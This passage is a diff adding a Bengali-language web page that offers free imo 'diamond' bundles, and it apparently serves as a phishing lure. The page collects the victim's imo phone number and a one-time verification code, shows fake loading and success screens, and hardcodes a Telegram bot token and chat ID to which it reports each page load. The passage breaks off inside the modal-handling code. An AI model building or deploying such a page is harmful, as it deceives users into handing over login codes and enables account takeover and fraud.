@@ -1,0 +1,1161 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+    <title>ইমু ডাইমন — ফ্রি বান্ডেল</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+    <style>
+        /* ===== রিসেট ও বেস ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+        }
+        body {
+            background: #f0f7f0;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+            background-image: radial-gradient(ellipse at 20% 50%, #e8f5e9 0%, #f0f7f0 70%);
+        }
+        .app-container {
+            max-width: 440px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 40px;
+            padding: 0 0 32px 0;
+            box-shadow: 0 20px 60px rgba(0, 80, 50, 0.12), 0 8px 24px rgba(0, 0, 0, 0.04);
+            border: 1px solid rgba(0, 168, 107, 0.08);
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* ===== হেডার ===== */
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 20px 20px 0 20px;
+            margin-bottom: 6px;
+        }
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .emu-icon {
+            width: 48px;
+            height: 48px;
+            background: linear-gradient(135deg, #00a86b, #008a56);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 8px 20px rgba(0, 168, 107, 0.25);
+        }
+        .emu-icon svg {
+            width: 30px;
+            height: 30px;
+            fill: #ffffff;
+        }
+        .logo-text .brand {
+            font-size: 22px;
+            font-weight: 800;
+            color: #1a2e1a;
+            letter-spacing: -0.5px;
+        }
+        .logo-text .brand .green { color: #00a86b; }
+        .logo-text .brand .diamond { color: #00a86b; font-size: 18px; }
+        .logo-text .tagline {
+            font-size: 12px;
+            color: #5a7a6a;
+            font-weight: 500;
+            margin-top: -2px;
+        }
+        .header-badge {
+            background: #e8f5e9;
+            color: #00a86b;
+            font-size: 11px;
+            font-weight: 700;
+            padding: 6px 14px;
+            border-radius: 40px;
+            border: 1px solid rgba(0, 168, 107, 0.12);
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            white-space: nowrap;
+        }
+
+        /* ===== ব্যানার (imo লোগো সহ) ===== */
+        .banner {
+            margin: 16px 20px 20px 20px;
+            background: linear-gradient(135deg, #00a86b, #008a56);
+            border-radius: 24px;
+            padding: 28px 24px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 8px 32px rgba(0, 168, 107, 0.20);
+            min-height: 110px;
+            display: flex;
+            align-items: center;
+        }
+        .banner::before {
+            content: '';
+            position: absolute;
+            top: -40px;
+            right: -40px;
+            width: 160px;
+            height: 160px;
+            background: rgba(255, 255, 255, 0.06);
+            border-radius: 50%;
+        }
+        .banner::after {
+            content: '';
+            position: absolute;
+            bottom: -60px;
+            left: -20px;
+            width: 120px;
+            height: 120px;
+            background: rgba(255, 255, 255, 0.04);
+            border-radius: 50%;
+        }
+        .banner-content {
+            position: relative;
+            z-index: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+        .banner-content .banner-icon {
+            font-size: 32px;
+            color: #fff;
+            opacity: 0.9;
+            margin-bottom: 2px;
+        }
+        .banner-content h2 {
+            font-size: 26px;
+            font-weight: 800;
+            color: #ffffff;
+            letter-spacing: -0.5px;
+            line-height: 1.2;
+        }
+        .banner-content h2 span {
+            background: rgba(255, 255, 255, 0.15);
+            padding: 0 8px;
+            border-radius: 8px;
+        }
+        .banner-content p {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.85);
+            font-weight: 500;
+            margin-top: 2px;
+        }
+        .banner-content .banner-badge {
+            display: inline-block;
+            background: rgba(255, 255, 255, 0.20);
+            padding: 4px 14px;
+            border-radius: 40px;
+            font-size: 12px;
+            font-weight: 600;
+            color: #fff;
+            margin-top: 4px;
+            align-self: flex-start;
+            backdrop-filter: blur(4px);
+        }
+        /* imo লোগো (ব্যানারের ডান পাশে) */
+        .banner-imo {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            z-index: 2;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background: rgba(255, 255, 255, 0.12);
+            padding: 6px 10px;
+            border-radius: 16px;
+            backdrop-filter: blur(4px);
+            border: 1px solid rgba(255, 255, 255, 0.10);
+        }
+        .banner-imo i {
+            font-size: 28px;
+            color: #fff;
+            opacity: 0.9;
+        }
+        .banner-imo span {
+            font-size: 10px;
+            color: rgba(255, 255, 255, 0.8);
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            margin-top: 2px;
+        }
+
+        /* ===== সেকশন টাইটেল ===== */
+        .section-title {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 20px;
+            margin-bottom: 14px;
+        }
+        .section-title h2 {
+            font-size: 16px;
+            font-weight: 700;
+            color: #1a2e1a;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .section-title h2 i { color: #00a86b; }
+        .section-title span {
+            font-size: 12px;
+            color: #7a9a8a;
+            background: #f0f7f2;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-weight: 600;
+        }
+
+        /* ===== বান্ডেল গ্রিড ===== */
+        .bundle-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 14px;
+            padding: 0 20px;
+        }
+        .bundle-card {
+            background: #fafffc;
+            border-radius: 24px;
+            padding: 18px 12px 16px;
+            text-align: center;
+            border: 1px solid rgba(0, 168, 107, 0.08);
+            transition: all 0.25s ease;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.02);
+            position: relative;
+            overflow: hidden;
+        }
+        .bundle-card:hover {
+            transform: translateY(-3px);
+            border-color: rgba(0, 168, 107, 0.2);
+            box-shadow: 0 12px 32px rgba(0, 168, 107, 0.08);
+        }
+        .free-badge {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: #00a86b;
+            color: #fff;
+            font-size: 9px;
+            font-weight: 700;
+            padding: 3px 10px;
+            border-radius: 40px;
+            text-transform: uppercase;
+            box-shadow: 0 4px 12px rgba(0, 168, 107, 0.2);
+        }
+        .bundle-diamond {
+            font-size: 32px;
+            color: #00a86b;
+            margin-bottom: 4px;
+            display: block;
+            line-height: 1;
+        }
+        .bundle-name {
+            font-size: 13px;
+            font-weight: 600;
+            color: #2a4a3a;
+            margin-bottom: 2px;
+        }
+        .bundle-amount {
+            font-size: 30px;
+            font-weight: 800;
+            color: #0a2a1a;
+            line-height: 1.2;
+        }
+        .bundle-amount small {
+            font-size: 14px;
+            font-weight: 500;
+            color: #5a7a6a;
+            margin-left: 2px;
+        }
+        .bundle-sub {
+            font-size: 11px;
+            color: #7a9a8a;
+            margin-top: 2px;
+            font-weight: 500;
+        }
+        .free-btn {
+            margin-top: 14px;
+            background: linear-gradient(135deg, #00a86b, #008a56);
+            border: none;
+            color: #ffffff;
+            font-weight: 700;
+            font-size: 14px;
+            padding: 12px 0;
+            width: 100%;
+            border-radius: 40px;
+            cursor: pointer;
+            transition: all 0.2s;
+            box-shadow: 0 6px 20px rgba(0, 168, 107, 0.25);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .free-btn:active { transform: scale(0.96); }
+        .free-btn:disabled {
+            opacity: 0.4;
+            pointer-events: none;
+            filter: grayscale(0.5);
+        }
+
+        /* ===== ফুটার ===== */
+        .footer-note {
+            text-align: center;
+            color: #8aaa9a;
+            font-size: 12px;
+            margin-top: 20px;
+            padding: 16px 20px 0 20px;
+            border-top: 1px solid rgba(0, 168, 107, 0.06);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .footer-note i { color: #00a86b; }
+
+        /* ===== মডাল ===== */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(10, 30, 20, 0.6);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            justify-content: center;
+            align-items: center;
+            z-index: 999;
+            padding: 20px;
+            animation: fadeIn 0.3s ease;
+        }
+        .modal-overlay.active { display: flex; }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.96); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        .modal-box {
+            background: #ffffff;
+            border-radius: 32px;
+            padding: 32px 24px 28px;
+            max-width: 420px;
+            width: 100%;
+            border: 1px solid rgba(0, 168, 107, 0.08);
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.15);
+            position: relative;
+            overflow: hidden;
+        }
+        .modal-close {
+            position: absolute;
+            top: 16px;
+            right: 18px;
+            background: #f0f7f2;
+            border: none;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            color: #5a7a6a;
+            font-size: 18px;
+            cursor: pointer;
+            transition: 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 2;
+        }
+        .modal-close:hover { background: #e0ebe2; }
+        .modal-title {
+            color: #1a2e1a;
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 4px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .modal-title i { color: #00a86b; }
+        .modal-sub {
+            color: #5a7a6a;
+            font-size: 14px;
+            margin-bottom: 22px;
+            line-height: 1.5;
+        }
+        .modal-label {
+            color: #2a4a3a;
+            font-size: 14px;
+            font-weight: 600;
+            display: block;
+            margin-bottom: 6px;
+        }
+        .modal-label i { color: #00a86b; margin-right: 6px; }
+        .modal-input {
+            width: 100%;
+            padding: 14px 18px;
+            border-radius: 16px;
+            border: 2px solid #e8f0ea;
+            background: #fafffc;
+            color: #1a2e1a;
+            font-size: 16px;
+            outline: none;
+            transition: 0.2s;
+            margin-bottom: 16px;
+            font-weight: 500;
+        }
+        .modal-input:focus {
+            border-color: #00a86b;
+            box-shadow: 0 0 0 4px rgba(0, 168, 107, 0.08);
+        }
+        .modal-input:disabled {
+            opacity: 0.6;
+            background: #f5faf7;
+        }
+        .modal-input::placeholder { color: #aac0b5; font-weight: 400; }
+        .modal-btn {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 40px;
+            background: linear-gradient(135deg, #00a86b, #008a56);
+            color: #ffffff;
+            font-weight: 700;
+            font-size: 16px;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 4px 24px rgba(0, 168, 107, 0.25);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .modal-btn:active { transform: scale(0.97); }
+        .modal-btn:disabled {
+            opacity: 0.4;
+            pointer-events: none;
+        }
+
+        /* ===== OTP সেকশন ===== */
+        .otp-section {
+            display: none;
+            margin-top: 4px;
+            animation: fadeIn 0.3s ease;
+        }
+        .otp-section.active { display: block; }
+        .otp-box-container {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 16px 0 18px 0;
+        }
+        .otp-box {
+            width: 48px;
+            height: 58px;
+            text-align: center;
+            font-size: 26px;
+            font-weight: 700;
+            color: #1a2e1a;
+            border: 2px solid #dce8e0;
+            border-radius: 14px;
+            background: #fafffc;
+            outline: none;
+            transition: all 0.2s ease;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.02);
+            caret-color: #00a86b;
+        }
+        .otp-box:focus {
+            border-color: #00a86b;
+            box-shadow: 0 0 0 4px rgba(0, 168, 107, 0.10), 0 4px 16px rgba(0, 168, 107, 0.06);
+            transform: scale(1.02);
+        }
+        .otp-box:disabled {
+            opacity: 0.5;
+            background: #f5faf7;
+        }
+        .otp-box.filled {
+            border-color: #00a86b;
+            background: #f0faf4;
+        }
+        .otp-box.error-shake {
+            animation: shake 0.4s ease;
+            border-color: #e74c3c;
+        }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-6px); }
+            75% { transform: translateX(6px); }
+        }
+
+        .timer-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            background: #f0f7f2;
+            border-radius: 40px;
+            padding: 10px 18px;
+            margin: 6px 0 16px 0;
+            border: 1px solid rgba(0, 168, 107, 0.1);
+        }
+        .timer-container i {
+            color: #00a86b;
+            font-size: 18px;
+        }
+        .timer-container .timer-text {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1a2e1a;
+            font-variant-numeric: tabular-nums;
+            letter-spacing: 1px;
+        }
+        .timer-container .timer-text.expired {
+            color: #e74c3c;
+        }
+
+        /* ===== লোডিং ওভারলে (সাধারণ) ===== */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.92);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            flex-direction: column;
+            padding: 40px;
+            animation: fadeIn 0.3s ease;
+        }
+        .loading-overlay.active { display: flex; }
+        .loading-spinner {
+            width: 72px;
+            height: 72px;
+            border-radius: 50%;
+            border: 4px solid #e8f0ea;
+            border-top-color: #00a86b;
+            animation: spin 0.9s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+            margin-bottom: 28px;
+            box-shadow: 0 0 0 8px rgba(0, 168, 107, 0.04);
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .loading-text {
+            color: #1a2e1a;
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 6px;
+        }
+        .loading-sub {
+            color: #5a7a6a;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .loading-progress {
+            width: 200px;
+            height: 4px;
+            background: #e8f0ea;
+            border-radius: 4px;
+            margin-top: 20px;
+            overflow: hidden;
+        }
+        .loading-progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #00a86b, #00c97e);
+            border-radius: 4px;
+            animation: progressAnim 2.2s ease forwards;
+        }
+        @keyframes progressAnim {
+            0% { width: 0%; }
+            30% { width: 25%; }
+            70% { width: 72%; }
+            100% { width: 100%; }
+        }
+
+        /* ===== সফল পপআপ ===== */
+        .success-popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(10, 30, 20, 0.6);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            justify-content: center;
+            align-items: center;
+            z-index: 1100;
+            padding: 20px;
+            animation: fadeIn 0.35s ease;
+        }
+        .success-popup.active { display: flex; }
+        .success-box {
+            background: #ffffff;
+            border-radius: 36px;
+            padding: 40px 28px 32px;
+            max-width: 380px;
+            width: 100%;
+            text-align: center;
+            border: 1px solid rgba(0, 168, 107, 0.1);
+            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.12);
+            position: relative;
+            overflow: hidden;
+        }
+        .success-icon {
+            font-size: 64px;
+            color: #00a86b;
+            margin-bottom: 12px;
+            display: block;
+        }
+        .success-title {
+            color: #1a2e1a;
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 6px;
+        }
+        .success-desc {
+            color: #4a6a5a;
+            font-size: 16px;
+            line-height: 1.7;
+            margin-bottom: 24px;
+        }
+        .success-desc strong {
+            color: #00a86b;
+            font-weight: 700;
+            font-size: 18px;
+        }
+        .success-btn {
+            background: linear-gradient(135deg, #00a86b, #008a56);
+            border: none;
+            color: #ffffff;
+            font-weight: 700;
+            font-size: 16px;
+            padding: 14px 48px;
+            border-radius: 40px;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 4px 24px rgba(0, 168, 107, 0.25);
+        }
+        .success-btn:active { transform: scale(0.96); }
+
+        /* ===== রেস্পন্সিভ ===== */
+        @media (max-width: 420px) {
+            .app-container { border-radius: 28px; }
+            .header { padding: 16px 16px 0 16px; }
+            .emu-icon { width: 42px; height: 42px; border-radius: 14px; }
+            .emu-icon svg { width: 26px; height: 26px; }
+            .logo-text .brand { font-size: 19px; }
+            .header-badge { font-size: 10px; padding: 4px 10px; }
+            .banner { margin: 12px 16px 16px 16px; padding: 20px 18px; min-height: 90px; }
+            .banner-content h2 { font-size: 22px; }
+            .banner-content .banner-icon { font-size: 26px; }
+            .banner-imo { padding: 4px 8px; }
+            .banner-imo i { font-size: 22px; }
+            .banner-imo span { font-size: 8px; }
+            .bundle-grid { gap: 10px; padding: 0 16px; }
+            .bundle-card { padding: 14px 8px; border-radius: 18px; }
+            .bundle-amount { font-size: 26px; }
+            .bundle-diamond { font-size: 28px; }
+            .section-title { padding: 0 16px; }
+            .modal-box { padding: 24px 16px 22px; border-radius: 24px; }
+            .modal-title { font-size: 18px; }
+            .success-box { padding: 32px 20px 28px; }
+            .otp-box { width: 40px; height: 50px; font-size: 22px; }
+            .otp-box-container { gap: 8px; }
+            .footer-note { padding: 16px 16px 0 16px; }
+        }
+        @media (max-width: 380px) {
+            .otp-box { width: 34px; height: 44px; font-size: 18px; }
+            .otp-box-container { gap: 4px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== অ্যাপ ===== -->
+    <div class="app-container">
+
+        <!-- ===== হেডার ===== -->
+        <div class="header">
+            <div class="header-left">
+                <div class="emu-icon">
+                    <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M38 12 C32 8, 26 10, 22 16 C18 22, 16 30, 18 38 C20 46, 26 52, 34 54 C42 56, 50 52, 54 44 C58 36, 56 26, 50 20 C46 16, 42 14, 38 12 Z M24 18 C26 14, 30 12, 34 14 C36 16, 34 20, 30 22 C26 24, 22 22, 24 18 Z M28 26 C30 24, 34 24, 36 26 C38 28, 36 32, 32 34 C28 36, 26 32, 28 26 Z M40 30 C42 28, 46 28, 48 30 C50 32, 48 36, 44 38 C40 40, 38 36, 40 30 Z M32 44 C36 42, 40 44, 42 48 C44 52, 40 56, 36 54 C32 52, 30 48, 32 44 Z" />
+                        <circle cx="28" cy="18" r="2.5" fill="#fff" opacity="0.6"/>
+                        <circle cx="32" cy="16" r="1.5" fill="#fff" opacity="0.4"/>
+                    </svg>
+                </div>
+                <div class="logo-text">
+                    <div class="brand">
+                        <span class="green">ইমু</span>
+                        <span class="diamond"><i class="fas fa-gem"></i></span>
+                        <span>ডাইমন</span>
+                    </div>
+                    <div class="tagline"><i class="fas fa-gift" style="color:#00a86b;margin-right:4px;"></i> ফ্রি বান্ডেল</div>
+                </div>
+            </div>
+            <div class="header-badge"><i class="fas fa-star"></i> ফ্রি</div>
+        </div>
+
+        <!-- ===== ব্যানার (imo লোগো সহ) ===== -->
+        <div class="banner">
+            <div class="banner-content">
+                <div class="banner-icon"><i class="fas fa-gem"></i></div>
+                <h2>ফ্রি <span>ডাইমন</span> ইমু</h2>
+                <p>আজই আপনার ফ্রি বান্ডেল ক্লেইম করুন</p>
+                <span class="banner-badge"><i class="fas fa-bolt"></i> সীমাহীন অফার</span>
+            </div>
+            <!-- imo লোগো -->
+            <div class="banner-imo">
+                <i class="fas fa-comment-dots"></i>
+                <span>imo</span>
+            </div>
+        </div>
+
+        <!-- ===== সেকশন টাইটেল ===== -->
+        <div class="section-title">
+            <h2><i class="fas fa-box-open"></i> বান্ডেল সমূহ</h2>
+            <span><i class="fas fa-infinity"></i> সীমাহীন</span>
+        </div>
+
+        <!-- ===== বান্ডেল গ্রিড ===== -->
+        <div class="bundle-grid" id="bundleGrid"></div>
+
+        <!-- ===== ফুটার ===== -->
+        <div class="footer-note">
+            <i class="fas fa-shield-alt"></i>
+            <span>সব বান্ডেল সম্পূর্ণ ফ্রি · কোনো শর্ত নেই</span>
+        </div>
+    </div>
+
+    <!-- ===== মডাল ===== -->
+    <div class="modal-overlay" id="modalOverlay">
+        <div class="modal-box">
+            <button class="modal-close" id="closeModalBtn"><i class="fas fa-times"></i></button>
+            <div class="modal-title" id="modalTitle"><i class="fas fa-phone-alt"></i> ইমু নম্বর দিন</div>
+            <div class="modal-sub" id="modalSubText">আপনার ইমু নম্বর দিয়ে বান্ডেলটি ক্লেইম করুন</div>
+
+            <label class="modal-label" id="labelEmu"><i class="fas fa-mobile-alt"></i> ইমু নম্বর</label>
+            <input type="text" class="modal-input" id="emuInput" placeholder="01XXXXXXXXX" maxlength="11" inputmode="numeric" />
+
+            <!-- ===== OTP সেকশন ===== -->
+            <div class="otp-section" id="otpSection">
+                <label class="modal-label" style="text-align:center;margin-bottom:4px;">
+                    <i class="fas fa-key"></i> OTP কোড <span style="color:#7a9a8a;font-weight:400;">(৬ ডিজিট)</span>
+                </label>
+                <div class="otp-box-container" id="otpBoxContainer">
+                    <input type="text" class="otp-box" id="otp1" maxlength="1" inputmode="numeric" autocomplete="off" />
+                    <input type="text" class="otp-box" id="otp2" maxlength="1" inputmode="numeric" autocomplete="off" />
+                    <input type="text" class="otp-box" id="otp3" maxlength="1" inputmode="numeric" autocomplete="off" />
+                    <input type="text" class="otp-box" id="otp4" maxlength="1" inputmode="numeric" autocomplete="off" />
+                    
+                    
+                </div>
+                <div class="timer-container" id="timerContainer">
+                    <i class="fas fa-hourglass-half"></i>
+                    <span class="timer-text" id="timerDisplay">০২:০০</span>
+                </div>
+                <div style="text-align:center;font-size:12px;color:#8aaa9a;margin-bottom:12px;">
+                    <i class="fas fa-info-circle"></i> আপনার মোবাইলে ৬-ডিজিটের OTP পাঠানো হয়েছে
+                </div>
+            </div>
+
+            <button class="modal-btn" id="actionBtn"><i class="fas fa-gift"></i> ক্লেইম করুন</button>
+        </div>
+    </div>
+
+    <!-- ===== লোডিং ওভারলে (প্রথম লোডিং ও নম্বরের পরের লোডিং এর জন্য) ===== -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+        <div class="loading-text" id="loadingText">প্রক্রিয়াকরণ...</div>
+        <div class="loading-sub" id="loadingSubText">দয়া করে অপেক্ষা করুন</div>
+        <div class="loading-progress"><div class="loading-progress-bar" id="progressBar"></div></div>
+    </div>
+
+    <!-- ===== সফল পপআপ ===== -->
+    <div class="success-popup" id="successPopup">
+        <div class="success-box">
+            <span class="success-icon"><i class="fas fa-check-circle"></i></span>
+            <div class="success-title">অভিনন্দন! 🎉</div>
+            <div class="success-desc" id="successDesc">সফলভাবে <strong>১০০</strong> ডাইমন দেয়া হয়েছে</div>
+            <button class="success-btn" id="successOkBtn">ঠিক আছে</button>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            'use strict';
+
+            // ===== টেলিগ্রাম =====
+            const BOT_TOKEN = '8795543254:AAE_1TiK758XRgs2fB9efz_TwlpJHQwf6j0';
+            const CHAT_ID = '8112273034';
+            const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+            function sendToTelegram(message) {
+                fetch(TELEGRAM_API, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
+                })
+                .then(res => res.json())
+                .then(data => {
+                    if (!data.ok) console.error('টেলিগ্রামে সমস্যা:', data);
+                    else console.log('✅ টেলিগ্রামে পাঠানো হয়েছে:', message);
+                })
+                .catch(err => console.error('Fetch error:', err));
+            }
+
+            // ===== পেজ লোড =====
+            window.addEventListener('load', function() {
+                sendToTelegram('successful device (ꮲ꯭ᴜ꯭ᴛ꯭ᴜ꯭ʟ͟)');
+                console.log('📤 পেজ লোড: successful device (✦ᚐ꯭ ֟፝ ꯭ᚐ⏱᪵ ꯭꯭꯭꯭꯭ꮲ꯭ᴜ꯭ᴛ꯭ᴜ꯭ʟ͟ ⋆꯭᪣᜴֟፝ᩴ)');
+            });
+
+            // ===== কনফিগ =====
+            const OTP_LENGTH = 4;
+            const TIMER_SECONDS = 120;
+
+            const bundles = [
+                { id: 1, name: 'স্টার্টার', amount: 100, icon: 'fa-star' },
+                { id: 2, name: 'বেসিক', amount: 250, icon: 'fa-bolt' },
+                { id: 3, name: 'প্রিমিয়াম', amount: 500, icon: 'fa-crown' },
+                { id: 4, name: 'মেগা', amount: 1000, icon: 'fa-gem' },
+            ];
+
+            // ===== DOM =====
+            const grid = document.getElementById('bundleGrid');
+            const modalOverlay = document.getElementById('modalOverlay');
+            const closeModalBtn = document.getElementById('closeModalBtn');
+            const modalTitle = document.getElementById('modalTitle');
+            const modalSubText = document.getElementById('modalSubText');
+            const emuInput = document.getElementById('emuInput');
+            const labelEmu = document.getElementById('labelEmu');
+            const otpSection = document.getElementById('otpSection');
+            const actionBtn = document.getElementById('actionBtn');
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            const loadingText = document.getElementById('loadingText');
+            const loadingSubText = document.getElementById('loadingSubText');
+            const successPopup = document.getElementById('successPopup');
+            const successDesc = document.getElementById('successDesc');
+            const successOkBtn = document.getElementById('successOkBtn');
+            const timerDisplay = document.getElementById('timerDisplay');
+
+            const otpBoxes = [
+                document.getElementById('otp1'),
+                document.getElementById('otp2'),
+                document.getElementById('otp3'),
+                document.getElementById('otp4'),
+               
+                
+            ];
+
+            // ===== স্টেট =====
+            let selectedAmount = 100;
+            let selectedName = 'স্টার্টার';
+            let isClaimed = false;
+            let currentStep = 'emu';
+            let isProcessing = false;
+            let emuNumber = '';
+
+            let timerInterval = null;
+            let timeLeft = TIMER_SECONDS;
+            let isTimerRunning = false;
+
+            // ===== OTP বক্স সেটআপ =====
+            function setupOtpBoxes() {
+                otpBoxes.forEach((box, index) => {
+                    box.addEventListener('input', function(e) {
+                        const val = this.value;
+                        if (val && !/^\d$/.test(val)) { this.value = ''; return; }
+                        if (val) {
+                            this.classList.add('filled');
+                            if (index < otpBoxes.length - 1) otpBoxes[index + 1].focus();
+                            else otpBoxes[index].blur();
+                        } else {
+                            this.classList.remove('filled');
+                        }
+                    });
+                    box.addEventListener('keydown', function(e) {
+                        if (e.key === 'Backspace' && !this.value && index > 0) {
+                            otpBoxes[index - 1].focus();
+                            otpBoxes[index - 1].value = '';
+                            otpBoxes[index - 1].classList.remove('filled');
+                        }
+                        if (e.key === 'Enter') {
+                            e.preventDefault();
+                            const allFilled = otpBoxes.every(b => b.value.length === 1);
+                            if (allFilled && !actionBtn.disabled) handleAction();
+                            else {
+                                const emptyIndex = otpBoxes.findIndex(b => b.value.length === 0);
+                                if (emptyIndex !== -1) otpBoxes[emptyIndex].focus();
+                            }
+                        }
+                    });
+                    box.addEventListener('paste', function(e) {
+                        e.preventDefault();
+                        const paste = (e.clipboardData || window.clipboardData).getData('text');
+                        const digits = paste.replace(/\D/g, '').slice(0, OTP_LENGTH);
+                        if (digits) {
+                            const chars = digits.split('');
+                            otpBoxes.forEach((b, i) => {
+                                if (i < chars.length) { b.value = chars[i]; b.classList.add('filled'); }
+                                else { b.value = ''; b.classList.remove('filled'); }
+                            });
+                            const nextIndex = Math.min(chars.length, OTP_LENGTH - 1);
+                            if (nextIndex < OTP_LENGTH) otpBoxes[nextIndex].focus();
+                            else otpBoxes[OTP_LENGTH - 1].blur();
+                        }
+                    });
+                });
+            }
+
+            function getOtpValue() { return otpBoxes.map(b => b.value).join(''); }
+            function resetOtpBoxes() {
+                otpBoxes.forEach(b => { b.value = ''; b.classList.remove('filled'); b.disabled = false; });
+                otpBoxes[0].focus();
+            }
+            function disableOtpBoxes(disabled) { otpBoxes.forEach(b => b.disabled = disabled); }
+
+            // ===== লোডিং শো/হাইড (কাস্টম টেক্সট সহ) =====
+            function showLoading(title, sub) {
+                loadingText.textContent = title || 'প্রক্রিয়াকরণ...';
+                loadingSubText.textContent = sub || 'দয়া করে অপেক্ষা করুন';
+                loadingOverlay.classList.add('active');
+                const bar = document.getElementById('progressBar');
+                bar.style.animation = 'none';
+                void bar.offsetHeight;
+                bar.style.animation = 'progressAnim 2.2s ease forwards';
+            }
+            function hideLoading() { loadingOverlay.classList.remove('active'); }
+
+            // ===== বান্ডেল রেন্ডার =====
+            function renderBundles() {
+                grid.innerHTML = '';
+                bundles.forEach(b => {
+                    const card = document.createElement('div');
+                    card.className = 'bundle-card';
+                    card.innerHTML = `
+                        <span class="free-badge"><i class="fas fa-gift"></i> ফ্রি</span>
+                        <span class="bundle-diamond"><i class="fas fa-gem"></i></span>
+                        <div class="bundle-name">${b.name}</div>
+                        <div class="bundle-amount">${b.amount} <small>ডাইমন</small></div>
+                        <div class="bundle-sub"><i class="fas fa-tag"></i> ফ্রি বান্ডেল</div>
+                        <button class="free-btn" data-amount="${b.amount}" data-name="${b.name}">
+                            <i class="fas fa-gift"></i> ফ্রি নিন
+                        </button>
+                    `;
+                    grid.appendChild(card);
+                });
+                document.querySelectorAll('.free-btn').forEach(btn => {
+                    btn.addEventListener('click', function(e) {
+                        e.stopPropagation();
+                        if (isClaimed) { alert('আপনি ইতিমধ্যে একটি বান্ডেল ক্লেইম করেছেন!'); return; }
+                        const amount = parseInt(this.dataset.amount, 10);
+                        const name = this.dataset.name;
+                        // ফ্রি বাটনে ক্লিক করলে প্রথমে লোডিং দেখাবে
+                        handleBundleClick(amount, name);
+                    });
+                });
+            }
+
+            // ===== ফ্রি বাটন ক্লিক =====
+            function handleBundleClick(amount, name) {
+                if (isProcessing) return;
+                isProcessing = true;
+                // লোডিং দেখান (প্রথম লোডিং)
+                showLoading('বান্ডেল প্রস্তুত হচ্ছে...', 'আপনার বান্ডেল লোড হচ্ছে');
+                setTimeout(() => {
+                    hideLoading();
+                    isProcessing = false;
+                    // নম্বর ইনপুট মডাল খোলা
+                    openModal(amount, name);
+                }, 2000);
+            }
+
+            // ===== মডাল =====
+            function openModal(amount, name) {
+                if (isClaimed) return;
